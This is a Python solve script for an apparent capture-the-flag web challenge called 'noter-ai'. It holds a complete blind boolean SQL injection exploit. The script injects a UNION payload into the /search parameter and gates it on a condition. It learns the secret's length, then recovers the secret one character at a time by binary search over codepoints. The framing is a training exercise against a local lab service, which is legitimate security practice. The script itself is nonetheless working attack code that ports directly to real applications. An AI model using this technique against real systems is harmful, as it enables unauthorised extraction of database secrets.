#!/usr/bin/env python3
"""Solve noter-ai: BLIND boolean SQL injection in /search.

The search query is  SELECT title, body FROM notes WHERE title LIKE '%<q>%'
(two columns), built by string concatenation. The page never prints the matched
rows now - only WHETHER any row came back ("Some notes matched" vs "No notes
matched"). So it is a boolean oracle: inject a UNION whose row appears only when
a guess about the secret is true, and extract secrets.value one character at a
time with a binary search.

Usage: python3 solve.py http://localhost:5007
"""
import sys
import urllib.parse
import urllib.request

base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5007").rstrip("/")
SECRET = "(SELECT value FROM secrets)"


def matched(cond):
    # A non-matching LIKE term, then a UNION row gated on `cond`, then -- to
    # comment out the trailing %'. "matched" iff the server evaluates cond true.
    payload = f"zzz%' UNION SELECT 1,2 WHERE {cond} -- "
    url = base + "/search?q=" + urllib.parse.quote(payload)
    body = urllib.request.urlopen(url, timeout=10).read().decode()
    return "matched your search" in body


# 1. length of the secret
n = 1
while n < 128 and not matched(f"length({SECRET})={n}"):
    n += 1

# 2. each character by binary search on its codepoint
flag = ""
for i in range(1, n + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if matched(f"unicode(substr({SECRET},{i},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    print(flag)

print("flag:", flag)
